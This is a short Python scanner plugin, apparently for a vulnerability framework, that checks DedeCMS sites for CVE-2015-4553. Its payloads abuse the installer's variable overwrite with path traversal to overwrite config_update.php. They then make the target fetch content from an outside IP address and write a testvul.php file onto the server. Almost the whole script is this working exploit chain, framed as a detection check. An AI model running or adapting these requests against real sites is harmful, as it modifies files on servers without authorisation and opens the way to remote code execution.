#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.expku.com/web/4955.html
#http://118.126.10.60/base-v57/是官网上的demodata不会消失

def assign(service, arg): 
    if service == "dedecms":
        return True,arg
		
def audit(arg): 
    url='/install/index.php'
    payload1='?step=11&insLockfile=utf-8&s_lang=urf-8&install_demo_name=../data/admin/config_update.php'
    payload2='?step=11&insLockfile=utf-8&s_lang=utf-8&install_demo_name=testvul.php&updateHost=http://118.126.10.60/base-v57/'
    testvul='/install/testvul.php'
    code, head, res, errcode, _ = curl.curl2(arg+url+payload1)
    if code == 200 and '远程获取失败' in res:
        code, head, res, errcode, _ = curl.curl2(arg+url+payload2)
        if code == 200 and '存在(您可以选择安装进行体验)' in res:
            code, head, res, errcode, _ = curl.curl2(arg+testvul)
            if code == 200 and 'INSERT INTO' in res:
                security_hole('[CVE-2015-4553]Dedecms variable coverage leads to getshell ' + arg + url)
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('dedecms', 'http://localhost:8080/DedeCMS-V5.7-UTF8-SP1-Full/uploads/')[1])